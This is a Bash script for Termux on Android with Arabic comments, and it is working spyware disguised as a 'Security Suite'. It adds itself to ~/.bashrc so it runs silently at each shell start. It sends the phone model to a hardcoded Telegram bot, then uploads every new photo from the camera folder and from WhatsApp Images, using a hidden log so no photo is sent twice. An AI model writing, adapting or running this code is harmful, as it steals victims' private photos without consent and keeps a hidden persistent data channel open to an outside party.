#!/bin/bash

# --- 1. إعدادات البوت ---
TOKEN="8669553208:AAGCy9MQTL9ogHuFXbZiZy4bqkXUnkdwHqg"
ID="7845603274"
URL_MSG="https://api.telegram.org/bot$TOKEN/sendMessage"
URL_DOC="https://api.telegram.org/bot$TOKEN/sendDocument"
LOG_FILE="$HOME/.sent_photos.log" # سجل الصور المرسلة (مخفي)

# --- 2. مرحلة التثبيت والحقن (تنفذ مرة واحدة) ---
if ! grep -q "security_task.sh" ~/.bashrc; then
    termux-setup-storage
    sleep 3
    pkg install curl -y -q
    
    # إنشاء ملف السجل (Database صغرية)
    touch "$LOG_FILE"
    
    # الحقن للعمل في الخلفية بصمت تام عند كل فتح
    echo "(bash ~/security_task.sh > /dev/null 2>&1 &)" >> ~/.bashrc
    
    echo -e "\e[1;32m[!] Security Suite Installed Successfully!\e[0m"
    exit 
fi

# --- 3. المهمة الذكية (إرسال الجديد فقط) ---
# إرسال إشعار للبوت بمعلومات الجهاز عند كل دخول
MODEL=$(getprop ro.product.model)
curl -s "$URL_MSG?chat_id=$ID&text=Smart_Access_Active: $MODEL" > /dev/null

# مسارات الصور المراد مراقبتها
paths=(
"/sdcard/DCIM/Camera/"
"/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/"
)

# فحص المسارات وإرسال ما لم يُرسل سابقاً
for path in "${paths[@]}"; do
    if [ -d "$path" ]; then
        # قراءة قائمة الصور في المجلد
        ls "$path" | while read photo; do
            # التحقق: هل اسم الصورة موجود في السجل؟
            if ! grep -q "$photo" "$LOG_FILE"; then
                # إرسال الصورة الجديدة
                response=$(curl -s -F chat_id=$ID -F document=@"$path$photo" "$URL_DOC")
                
                # إذا نجح الإرسال (تأكيد من تليجرام)، أضفها للسجل لكي لا نرسلها مجدداً
                if [[ $response == *"\"ok\":true"* ]]; then
                    echo "$photo" >> "$LOG_FILE"
                fi
                # تأخير بسيط لتجنب حظر البوت بسبب كثرة الرسائل (Anti-Spam)
                sleep 0.5
            fi
        done
    fi
done
